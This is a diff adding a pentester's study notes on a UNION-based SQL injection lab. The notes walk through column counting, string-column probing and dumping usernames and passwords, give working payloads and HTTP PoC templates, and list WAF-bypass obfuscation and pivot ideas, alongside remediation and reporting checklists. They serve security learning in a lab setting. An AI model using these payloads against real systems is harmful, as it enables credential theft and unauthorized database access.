@@ -564,3 +564,156 @@ Connection: close
 - Use information_schema to enumerate tables/columns quickly.
 
 ---
+
+# SQL Injection lab-5 — UNION Attacks — Notes 
+
+---
+
+## 🔹 One-line summary
+A UNION SQLi appends attacker-controlled SELECT rows to the original query result. When the app reflects results, UNION lets you read database rows (users, creds, API keys) directly in the page response.
+
+---
+
+## 🔹 What is this topic? (short)
+A UNION SQL injection allows an attacker to combine an attacker-crafted SELECT with the application’s original query and so return arbitrary rows (from users, information_schema, etc.) in the same page output.
+
+---
+
+## 🔹 Why this matters (real-world risk)
+- *Immediate data disclosure:* user tables, password hashes, API keys.  
+- *Fast pivot:* offline cracking of hashes → account takeover → lateral movement.  
+- UNION is usually the fastest path from “I can inject” → “I can exfiltrate”.
+
+---
+
+## 🔹 High-value endpoints / parameters to test
+- Category / filter / search endpoints: /filter?category=..., /search?q=...  
+- Item/detail pages: /product?id=..., /item?id=...  
+- Sort / pagination: order, page, limit  
+- JSON API fields: POST /api/search { "q":"..." }  
+- Any param that ends up in a SELECT whose results are rendered.
+
+---
+
+## 🔹 Quick concept checklist
+1. Determine number of columns *N* (UNION SELECT NULL,...).  
+2. Find which column(s) accept string data by injecting a short token into each column.  
+3. Use UNION SELECT username, password FROM users (or group_concat() if needed) to exfiltrate.  
+4. If UNION is blocked → obfuscate, cast, or switch to blind/OOB techniques.
+
+---
+
+## 🔹 Lab walkthrough — exact methodology 
+
+1. *Capture the request*  
+   - Proxy *ON* → perform the action that shows results (click category/filter).  
+   - Right-click the captured request → *Send to Repeater*.
+
+2. *Find number of columns (N)*  
+   - Send these (increment `NULL`s until the page returns normally):  
+     
+     ' UNION SELECT NULL--  
+     ' UNION SELECT NULL,NULL--  
+     ' UNION SELECT NULL,NULL,NULL--  
+       
+   - The NULL count that returns a normal page (no SQL error) = *N*.
+
+3. *Find string-compatible column(s)*  
+   - For N columns, test each column with a unique token (replace one NULL at a time):  
+     
+     ' UNION SELECT 'TOK',NULL,NULL--     (if N=3, test col1)
+     ' UNION SELECT NULL,'TOK',NULL--     (test col2)
+     ' UNION SELECT NULL,NULL,'TOK'--     (test col3)
+       
+   - Inspect *raw* response for TOK. The column that displays it is string-compatible.
+
+4. *Exfiltrate the users table*  
+   - If two string columns exist:
+     
+     ' UNION SELECT username, password FROM users--
+       
+   - If only one string column: concatenate rows into one field (MySQL example):
+     
+     ' UNION SELECT NULL,group_concat(concat(username,':',password) SEPARATOR 0x0a) FROM users--
+       
+   - Adjust NULL positions so the reflected column holds the extracted data.
+
+5. *Read results & act*  
+   - Inspect raw response for username:password pairs. Use discovered admin creds to log in (only in-scope labs).
+
+6. *Proof & report*  
+   - Save the raw request + raw response showing extracted data as PoC (screenshot + raw text).
+
+---
+
+## 🧾 Proof / Evidence
+
+1. *Screenshot 1 — Column count (NULLs)*  
+ ![Number of columns by applying NULLS](../images/union-null-count.png)  
+   Description: Repeater request showing the UNION SELECT NULL,... probes used to determine the correct column count *N* (response shows no DB error).
+
+2. *Screenshot 2 — String column token match*  
+   ![String compatible columns](../images/union-token-column-match.png)  
+   Description: Repeater request/response showing the injected test token (TOK) appearing in the page output — confirms the reflected column supports string data.
+
+3. *Screenshot 3 — Extracted credentials (administrator)*  
+   ![Credentials retrieved](../images/union-admin-creds.png)  
+   Description: Repeater response screenshot showing the extracted administrator credentials (displayed in the page output via UNION injection).
+
+> Place the screenshots in the images/ folder and keep raw requests/responses alongside them for PoC.
+
+---
+
+## 🔹 PoC templates 
+
+*Basic (two string cols)*
+GET /filter?category=Techgifts' UNION SELECT username, password FROM users-- HTTP/1.1 Host: example.lab [other headers copied from original request]
+
+*Concat into one column (MySQL; single reflected string column)*
+GET /filter?category=Techgifts' UNION SELECT NULL,group_concat(concat(username,':',password) SEPARATOR 0x0a) FROM users-- HTTP/1.1 Host: example.lab ...
+
+---
+
+## 🔹 Troubleshooting & common fixes
+- *No visible token but response ok:* view raw body / page source — token may be in attributes, scripts, comments.  
+- *Conversion errors (500):* that column is numeric-only — try other columns or CAST(... AS CHAR).  
+- *UNION blocked by WAF:* obfuscate (UN/**/ION), try ORDER BY counting, or use blind/OOB.  
+- *Results truncated:* use LIMIT/OFFSET or chunk with substring() or smaller group_concat pieces.  
+- *DB-specific syntax:* fingerprint DB and adapt (comment style, aggregate functions).
+
+---
+
+## 🔹 Reporting checklist (what to include)
+- Affected endpoint & parameter.  
+- Column count *N* and which column(s) accept strings.  
+- Exact PoC request(s) + raw response showing the data.  
+- Impact (accounts, sensitive data).  
+- Short reproduction steps (3–5 lines).  
+- Fixes: parameterized queries, whitelists, least privilege, hide DB errors.
+
+---
+
+## 🔹 Quick remediation checklist
+- Use parameterized queries / prepared statements.  
+- Avoid dynamic SQL built by concatenation.  
+- Whitelist allowed values.  
+- Limit DB account privileges.  
+- Hide DB errors; log suspicious SQL patterns.
+
+---
+
+## 🔹 Pocket memory cue
+*Count NULL`s → token per column → token visible = dump column → `UNION dump users (or group_concat).*
+
+---
+
+## 🔹 Out-of-the-box / advanced 
+- *Fingerprint DB:* UNION SELECT version() (MySQL/Postgres/MSSQL variations).  
+- *Metadata:* query information_schema.tables / information_schema.columns.  
+- *Chunking:* LIMIT/OFFSET, substring() to extract long fields in pieces.  
+- *When UNION blocked:* use error-based, blind/time-based, or OOB (DNS/HTTP) techniques.  
+- *Obfuscation:* UN/**/ION, CHAR()-built strings to bypass naive WAFs.  
+- *Pivot:* extract DB creds → internal APIs / cloud metadata / RCE (if privileges allow).  
+- *Tools:* sqlmap (use with care and throttle).
+
+---
